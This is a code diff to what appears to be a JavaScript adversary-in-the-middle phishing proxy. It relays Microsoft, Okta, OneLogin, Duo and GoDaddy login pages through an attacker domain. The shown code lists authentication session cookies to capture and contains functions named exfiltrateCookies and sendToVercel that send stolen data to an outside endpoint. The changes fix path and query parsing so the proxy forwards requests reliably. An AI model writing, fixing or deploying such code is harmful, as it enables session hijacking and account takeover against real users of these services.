@@ -48,14 +48,6 @@ const CRITICAL_AUTH_COOKIES = {
   godaddy: ['akm_lmprb-ssn', 'akm_lmprb', 'auth_id', 'auth_token', 'ssotoken', 'JSESSIONID']
 };
 
-const POST_LOGIN_PATTERNS = {
-  microsoft: ['/common/oauth2/authorize', '/common/oauth2/v2.0/authorize', '/common/login', '/common/SAS/ProcessAuth', '/kmsi'],
-  okta: ['/oauth2/v1/authorize', '/api/v1/authn'],
-  onelogin: ['/access/idp', '/session'],
-  duo: ['/frame/prompt'],
-  godaddy: ['/authenticate', '/login/authenticate']
-};
-
 async function sendToVercel(type, data) {
   try {
     await fetch(VERCEL_URL, {
@@ -78,23 +70,61 @@ async function exfiltrateCookies(cookieText, ip, platform, url) {
   } catch (e) {}
 }
 
-function getUpstreamInfo(pathname) {
+// CRITICAL FIX: Completely rewritten to properly parse path and handle query strings
+function getUpstreamInfo(pathname, search) {
+  // CRITICAL: Remove any 'path' parameters from search string immediately
+  // These are erroneous parameters that Zeabur or a previous redirect may have added
+  let cleanSearch = search || '';
+  if (cleanSearch) {
+    const params = new URLSearchParams(cleanSearch);
+    // Remove ALL 'path' parameters - they should never reach upstream
+    let modified = false;
+    while (params.has('path')) {
+      params.delete('path');
+      modified = true;
+    }
+    if (modified) {
+      cleanSearch = params.toString();
+      cleanSearch = cleanSearch ? '?' + cleanSearch : '';
+    }
+  }
+
   if (pathname.startsWith(PROXY_PREFIX)) {
+    // Remove the prefix: /_p/www.office.com/login -> www.office.com/login
     const withoutPrefix = pathname.slice(PROXY_PREFIX.length);
-    const upstreamDomain = withoutPrefix.split('/')[0];
-    const upstreamPath = '/' + withoutPrefix.slice(upstreamDomain.length + 1);
+    
+    // Find the first slash to separate domain from path
+    const firstSlash = withoutPrefix.indexOf('/');
+    
+    let upstreamDomain;
+    let upstreamPath;
+    
+    if (firstSlash === -1) {
+      // No path, just domain: /_p/www.office.com
+      upstreamDomain = withoutPrefix;
+      upstreamPath = '/';
+    } else {
+      // Has path: /_p/www.office.com/login
+      upstreamDomain = withoutPrefix.slice(0, firstSlash); // "www.office.com"
+      upstreamPath = withoutPrefix.slice(firstSlash); // "/login"
+    }
+    
     const provider = IDENTITY_PROVIDERS[upstreamDomain];
+    
     return {
       upstream: upstreamDomain,
       type: provider ? provider.type : 'unknown',
       path: upstreamPath,
+      search: cleanSearch,
       isProxied: true
     };
   }
+  
   return {
     upstream: INITIAL_UPSTREAM,
     type: 'microsoft',
     path: pathname,
+    search: cleanSearch,
     isProxied: false
   };
 }
@@ -116,7 +146,21 @@ function rewriteLocation(location) {
   try {
     const url = new URL(location);
     if (shouldProxyDomain(url.hostname)) {
-      return 'https://' + YOUR_DOMAIN + PROXY_PREFIX + url.hostname + url.pathname + url.search;
+      // CRITICAL FIX: Also clean any erroneous path parameters from redirect URLs
+      let cleanSearch = url.search;
+      if (cleanSearch) {
+        const params = new URLSearchParams(cleanSearch);
+        let modified = false;
+        while (params.has('path')) {
+          params.delete('path');
+          modified = true;
+        }
+        if (modified) {
+          cleanSearch = params.toString();
+          cleanSearch = cleanSearch ? '?' + cleanSearch : '';
+        }
+      }
+      return 'https://' + YOUR_DOMAIN + PROXY_PREFIX + url.hostname + url.pathname + cleanSearch;
     }
     return location;
   } catch (e) {
@@ -173,10 +217,12 @@ export default async function handleRequest(request) {
     return new Response('Access denied.', { status: 403 });
   }
 
-  const info = getUpstreamInfo(url.pathname);
+  // CRITICAL FIX: Pass both pathname and search to properly clean erroneous parameters
+  const info = getUpstreamInfo(url.pathname, url.search);
   const upstreamDomain = info.upstream;
-  const upstreamPath = info.path + url.search;
-  const upstreamUrl = 'https://' + upstreamDomain + upstreamPath;
+  
+  // Build upstream URL: domain + path + cleaned search
+  const upstreamUrl = 'https://' + upstreamDomain + info.path + info.search;
   
   console.log(`[${info.type}] ${request.method} ${url.pathname} -> ${upstreamUrl}`);
 
